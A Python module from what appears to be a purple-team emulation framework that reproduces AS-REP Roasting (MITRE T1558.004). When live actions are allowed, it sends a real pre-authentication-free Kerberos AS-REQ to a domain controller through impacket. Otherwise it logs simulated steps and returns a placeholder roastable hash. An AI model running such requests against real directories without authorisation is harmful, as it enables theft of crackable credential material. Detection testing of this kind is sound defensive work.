# emulators/ad_asrep.py
import datetime
import socket
from typing import Dict, Any
from emulators.base import BaseEmulator
from core.logger import logger
from core.config import KronosConfig

# Try to import impacket elements safely
try:
    from impacket.krb5.asn1 import AS_REQ, elemOf
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.kerberosv5 import getKerberosTGT

    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False


class ASREPRoastEmulator(BaseEmulator):
    """Emulates AS-REP Roasting (T1558.004) to target pre-authentication-disabled accounts."""

    def __init__(self, config: KronosConfig):
        super().__init__(
            name="AS-REP Roasting Emulation",
            mitre_id="T1558.004",
            event_id="4768",
            description="Requests a TGT for accounts without Kerberos pre-authentication enabled.",
            config=config,
        )

    def run(self) -> Dict[str, Any]:
        logger.info(f"Starting {self.name} (MITRE {self.mitre_id})...")
        timestamp = (
            datetime.datetime.now(datetime.timezone.utc)
            .isoformat()
            .replace("+00:00", "Z")
        )

        target_dc = self.config.active_directory.domain_controller
        domain = self.config.active_directory.domain_name
        target_user = "srv_backups"  # Default simulated target

        # 1. Test DC reachability
        dc_reachable = False
        if target_dc and target_dc != "dc01.domain.local":
            try:
                socket.create_connection(
                    (target_dc, self.config.active_directory.ldap_port), timeout=2
                )
                dc_reachable = True
            except (socket.timeout, OSError):
                logger.warning(
                    f"Domain Controller {target_dc} is unreachable. Falling back to local simulation."
                )

        if (
            self.config.execution.allow_live_actions
            and dc_reachable
            and IMPACKET_AVAILABLE
        ):
            logger.info(
                f"Target Domain Controller '{target_dc}' is active. Attempting real AS-REQ..."
            )
            try:
                # Real AS-REQ request using impacket
                # Here we attempt to request a TGT without pre-auth credentials
                userName = Principal(
                    target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                # This triggers a real Kerberos AS-REQ to the DC
                # getKerberosTGT will fail if pre-auth is required, but it will still generate Event 4768 on the DC.
                # In an AS-REP Roasting scenario, we want it to return the ticket without pre-auth.
                getKerberosTGT(userName, "", domain, None, None, kdcHost=target_dc)

                logger.success(
                    f"AS-REQ sent successfully for target user: {target_user}@{domain}"
                )
                return {
                    "status": "success",
                    "timestamp": timestamp,
                    "username_targeted": target_user,
                    "emulation_type": "real",
                    "details": {
                        "domain_controller": target_dc,
                        "domain": domain,
                        "encryption_requested": "RC4-HMAC (0x17)",
                        "result_msg": "AS-REQ sent. Check Event ID 4768 (Pre-auth type 0) on target DC.",
                    },
                }
            except Exception as e:
                logger.error(f"Error during real AS-REQ execution: {e}")
                return {
                    "status": "failed",
                    "timestamp": timestamp,
                    "username_targeted": target_user,
                    "emulation_type": "real",
                    "error": str(e),
                    "details": {"domain_controller": target_dc, "domain": domain},
                }
        else:
            # 2. Local Simulation Mode (Portfolio demonstration)
            logger.info("Executing KRONOS Safe Emulation Protocol...")
            logger.info(
                f"[SIMULATION] Connecting to LDAP {target_dc}:389 to query accounts..."
            )
            logger.info(
                f"[SIMULATION] Found target account: '{target_user}' with 'DONT_REQ_PREAUTH' attribute."
            )
            logger.info(
                f"[SIMULATION] Sending Kerberos AS-REQ to {target_dc} (Port 88) for user '{target_user}'..."
            )
            logger.success(
                f"[SIMULATION] Received AS-REP reply containing encrypted TGT hash for '{target_user}'!"
            )

            return {
                "status": "success",
                "timestamp": timestamp,
                "username_targeted": target_user,
                "emulation_type": "simulated",
                "details": {
                    "domain_controller": target_dc,
                    "domain": domain,
                    "encryption_requested": "RC4-HMAC (0x17)",
                    "ticket_hash": "$krb5asrep$23$srv_backups@domain.local:c7a022...fa10b2",
                    "result_msg": "Simulated AS-REQ executed safely. Indicators created.",
                },
            }
